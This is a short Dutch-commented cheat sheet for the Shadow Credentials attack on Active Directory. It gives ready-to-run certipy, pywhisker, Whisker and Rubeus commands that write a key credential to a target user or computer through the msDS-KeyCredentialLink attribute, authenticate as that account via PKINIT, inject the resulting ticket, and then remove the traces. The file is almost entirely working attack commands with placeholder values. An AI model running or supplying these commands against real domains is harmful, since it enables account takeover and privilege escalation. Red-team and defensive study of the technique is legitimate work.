# Shadow Credentials — msDS-KeyCredentialLink abuse (WHfB)
# Schrijf een Windows Hello for Business key naar een AD object
# Gebruik die key om als dat account te authenticeren via PKINIT
#
# === Vereisten ===
# - GenericWrite of GenericAll op het doelobject
# - ADCS enrollment moet beschikbaar zijn (of PKINIT support)
#
# === Voorbeelden ===

# certipy - Shadow credentials op user
certipy shadow auto -u USER@DOMAIN -p 'PASS' -account TARGET_USER -dc-ip DC_IP

# certipy - Shadow credentials op computer
certipy shadow auto -u USER@DOMAIN -p 'PASS' -account TARGET_COMPUTER$ -dc-ip DC_IP

# pywhisker (Python)
python3 pywhisker.py -d DOMAIN -u USER -p 'PASS' -t TARGET_USER --action add --dc-ip DC_IP

# Whisker (Windows)
.\Whisker.exe add /target:TARGET_USER /domain:DOMAIN /dc:DC_IP

# Na shadow credential: Authenticeer met verkregen certificaat
certipy auth -pfx target_user.pfx -dc-ip DC_IP

# Rubeus - PKINIT met certificaat
.\Rubeus.exe asktgt /user:TARGET_USER /certificate:cert.pfx /password:CertPass /dc:DC_IP /ptt

# Verwijder shadow credential (opruimen)
python3 pywhisker.py -d DOMAIN -u USER -p 'PASS' -t TARGET_USER --action remove --dc-ip DC_IP -D DEVICE_ID

# List bestaande shadow credentials
python3 pywhisker.py -d DOMAIN -u USER -p 'PASS' -t TARGET_USER --action list --dc-ip DC_IP

# Noot: Shadow Credentials schrijft naar msDS-KeyCredentialLink attribuut
# Noot: Werkt alleen als de domain functional level >= Windows Server 2016
# Noot: PKINIT moet ondersteund worden door de DC
# Noot: BloodHound edge: GenericWrite → Shadow Credentials → PKINIT
